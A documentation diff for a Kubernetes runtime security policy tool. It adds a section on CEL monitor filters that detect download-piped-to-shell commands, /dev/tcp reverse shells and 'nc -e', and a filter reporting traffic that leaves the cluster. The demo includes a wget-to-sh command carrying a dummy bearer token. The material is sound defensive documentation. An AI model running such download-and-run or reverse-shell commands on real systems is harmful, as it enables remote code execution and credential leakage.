@@ -242,8 +242,103 @@ know is dangerous; to allow only what the workload needs, see the default-deny
 
 ```bash
 kubectl delete rpol contain-agent
+```
+
+### Catch a command by what it does
+
+A deny list names binaries, but an attacker cares about what a command does, not which
+binary runs it. `curl | sh`, `wget | sh`, and a `/dev/tcp` reverse shell all start a shell
+the workload runs for legitimate reasons too, so denying the shell is not an option, and no
+path list tells them apart.
+
+Observe every exec instead, and let a CEL `monitorFilter` decide which ones are worth
+reporting. The filter runs over each observation, command-line arguments included, so it
+can match the shape of an attack rather than the name of a file:
+
+```bash
+kubectl apply -f - <<'EOF'
+apiVersion: runtime.nirmata.io/v1alpha1
+kind: RuntimePolicy
+metadata:
+  name: catch-pipe-to-shell
+spec:
+  mode: monitor
+  podSelector:
+    matchLabels:
+      app: agent
+  behaviors:
+  - exec:
+      deny:
+        values: ["*"]
+  monitorFilter:
+    expressions:
+    - name: exec-events-only
+      expression: 'has(event.exec)'
+    - name: download-and-run-or-reverse-shell
+      expression: >-
+        event.exec.argv.exists(a,
+          a.matches("(curl|wget)[^|]*\\|\\s*(\\S*/)?(ba)?sh\\b") ||
+          a.contains("/dev/tcp/") ||
+          a.matches("\\bnc\\s.*\\s-e\\s")) ||
+        (event.exec.argv.size() > 0 &&
+          event.exec.argv[0].matches("(^|/)nc$") &&
+          "-e" in event.exec.argv)
+EOF
+```
+
+Run two ordinary commands, then a download piped into a shell that carries an API token:
+
+```bash
+kubectl exec agent -- ls /
+kubectl exec agent -- sh -c 'echo hello'
+kubectl exec agent -- sh -c \
+  'wget -qO- -T 5 --header "Authorization: Bearer sk-live-4f9a8b7c6d5e" http://example.com/install.sh | sh'
+```
+
+Every one of those execs was observed, and only one is reported, with the full command line
+that ran. Allow about 20 seconds:
+
+```bash
+kubectl get report kyverno-runtime-agent \
+  -o jsonpath='{range .results[?(@.policy=="catch-pipe-to-shell")]}{.properties.argv}{"\n"}{end}'
+```
+
+```text
+sh -c wget -qO- -T 5 --header "Authorization: REDACTED http://example.com/install.sh | sh
+```
+
+The token never reaches the Report. Every value written to a Report passes through a fixed
+redaction step that replaces recognized credential shapes — bearer tokens, API keys, AWS key
+IDs, JWTs — and prompt payloads, and no setting turns it off. A credential in another shape,
+such as `curl -u user:password`, is not recognized, so try this with dummy values.
+
+```bash
+kubectl delete rpol catch-pipe-to-shell
 kubectl delete pod agent
 ```
+
+A filter works on every kind of observation and has the Kubernetes CEL libraries available.
+This one reports only the connections that leave the cluster, using the `CIDR` library to
+drop everything addressed to a private range:
+
+```yaml
+  behaviors:
+  - network:
+      deny:
+        values: ["*"]
+  monitorFilter:
+    expressions:
+    - name: leaves-the-cluster
+      expression: >-
+        has(event.net) &&
+        !["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
+          .exists(c, cidr(c).containsIP(event.net.destIP))
+```
+
+Both are runnable in full in
+[catch-pipe-to-shell](examples/monitoring/catch-pipe-to-shell/) and
+[report-external-egress](examples/monitoring/report-external-egress/). Every field a filter can
+read is listed in the [CEL reference](docs/users/reference/cel.md#monitorfilter-expressions).
 
 ### See what a workload reaches for
 
